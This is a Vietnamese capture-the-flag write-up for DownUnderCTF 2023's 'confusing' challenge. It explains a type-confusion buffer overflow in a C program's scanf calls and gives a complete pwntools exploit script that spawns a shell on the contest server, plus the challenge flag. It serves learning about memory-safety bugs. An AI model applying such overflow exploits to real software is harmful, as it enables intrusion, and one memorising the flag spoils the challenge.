# confusing

1 chall làm mình đau đầu cực 

## source C

```c 
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void init() {
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stdin, 0, 2, 0);
}

int main() {
    init();

    short d;
    double f;
    char s[4];
    int z; 

    printf("Give me d: ");
    scanf("%lf", &d);

    printf("Give me s: ");
    scanf("%d", &s);

    printf("Give me f: ");
    scanf("%8s", &f);

    if(z == -1 && d == 13337 && f == 1.6180339887 && strncmp(s, "FLAG", 4) == 0) {
        system("/bin/sh");
    } else {
        puts("Still confused?");
    }
}
```

nhiệm vụ đơn giản là ta chỉ cần cho **z = -1 && d = 13337 && f = 1.6180339887 và s = FLAG** là có shell

ở đây ta để ý thì **short d chỉ có 2 byte**, nhưng mà lại cho phép nhập là **scanf("%lf", &d)**, %lf là của double có 8byte, **đây có thể gọi là lỗi BOF vì ta có thể tràn được 6byte**

## Khai thác

bây giờ ta cứ thử debug xem sao

![image](https://github.com/gookoosss/CTF/assets/128712571/547f583e-65a4-420c-a550-6f99554345ea)


lúc này ta **nhập d vào địa chi 0x007fffffffe042**

![image](https://github.com/gookoosss/CTF/assets/128712571/62ca3109-76f8-413e-970d-af78cd679b01)


ta tìm được **địa chỉ của z là 0x7fffffffe044** và kế bên thằng d, lúc này ta nhảy ra liền ý tưởng là **lợi dụng lỗi BOF của thằng d để tràn biền ghi đè 4 byte thằng z thành 0xffffffff**

```python 
p16(0x3419) + b'\xff\xff\xff\xff'
```

có ý tưởng là vậy nhưng mà mình làm mãi mà ko thể nào chèn được đúng ý mình, nên mình đành tham khảo writeup của BTC:

https://github.com/DownUnderCTF/Challenges_2023_Public/tree/main/beginner/confusing

```python
p.sendlineafter(b'Give me d: ', str(struct.unpack('d', p16(0x3419) + b'\xff\xff\xff\xff' + b'\xff\xfe')[0]).encode())
```

![image](https://github.com/gookoosss/CTF/assets/128712571/fc0e9994-1631-4e9e-93b3-8c903318c3f6)


- **hmm tóm tắt lại những gì mình hiểu là:** thứ ta mong muốn gán vào là **p16(0x3419) + b'\xff\xff\xff\xff' (6 byte)** , nhưng scanf muốn ta gửi kiểu dữ liệu là double nên **ta phải biến nó thành double bằng struct.unpack('d', byte)[0]** *(ép byte ta gửi vào thành double)*, nhưng mà **unpack() chỉ nhận đủ 8byte** nên ta sẽ cho **thêm 2 byte cuối là b'\xff\xfe'**

- giải quyết xong thằng d và z rồi thì tiếp theo là thằng **s == 'FLAG', cái này thì đơn giản**

```python 
p.sendlineafter(b'Give me s: ', str(u32(b'FLAG')))
```

- cuối cùng là thằng f, **nó yêu cầu ta nhập kiểu dữ liệu string**, ta phải sử dụng **pack()** rồi
```python 
p.sendlineafter(b'Give me f: ', struct.pack('d', 1.6180339887))
```

![image](https://github.com/gookoosss/CTF/assets/128712571/1519a00e-7fa3-47f2-af84-27a6f3d658fb)


hiểu đơn giản như này, ở trên ta dùng **unpack() để chuyển từ dạng byte sang double**, thì ở đây **pack() sẽ ngược lại, nó sẽ chuyển từ dạng double sang byte** cho ta và ta có thể gán vào cho f thoải mái

dee cuối cùng là lấy shell thôi 

![image](https://github.com/gookoosss/CTF/assets/128712571/4cb7ea7e-5d9f-4f37-89fb-8ee9413ee553)


## script 

```python
from pwn import *

# p = process('./confusing')
p = remote('2023.ductf.dev', 30024)
exe = ELF('./confusing')

# gdb.attach(p, gdbscript = '''
# b*main+73
# b*main+114
# b*main+155
# c
# ''')

input()

# b'\xff\xff\xff\xff' == Z == 0xffffffff == -1
# p16(0x3419) == D == 13337

p.sendlineafter(b'Give me d: ', str(struct.unpack('d', p16(0x3419) + b'\xff\xff\xff\xff' + b'\xff\xfe')[0]).encode())
p.sendlineafter(b'Give me s: ', str(u32(b'FLAG')))
p.sendlineafter(b'Give me f: ', struct.pack('d', 1.6180339887))

p.interactive()

# DUCTF{typ3_c0nfus1on_c4n_b3_c0nfus1ng!}
```

## Flag

DUCTF{typ3_c0nfus1on_c4n_b3_c0nfus1ng!}

